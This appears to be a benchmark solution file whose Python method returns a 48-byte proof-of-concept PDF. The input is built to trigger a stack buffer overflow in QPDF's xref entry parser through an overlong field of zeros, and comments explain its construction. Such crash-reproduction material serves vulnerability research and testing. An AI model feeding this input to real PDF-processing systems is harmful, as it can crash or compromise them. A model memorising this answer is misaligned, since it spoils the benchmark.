import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a stack buffer overflow in QPDF::read_xrefEntry
        # caused by overlong f1 (offset) or f2 (generation) fields consisting only of zeros.
        # The ground truth PoC is 48 bytes long.
        
        # Breakdown of the 48-byte PoC:
        # 1. PDF Header: "%PDF-1.0\n" (9 bytes)
        # 2. Xref table keyword: "xref\n" (5 bytes)
        # 3. Subsection header (start 0, count 1): "0 1\n" (4 bytes)
        # 4. Malicious entry (overlong f1 field): 30 * "0" (30 bytes)
        # Total: 9 + 5 + 4 + 30 = 48 bytes.
        
        # This payload causes the parser to read more than the buffer size (typically 21 bytes)
        # when parsing the first field of the xref entry, triggering the overflow.
        
        return b"%PDF-1.0\nxref\n0 1\n" + b"0" * 30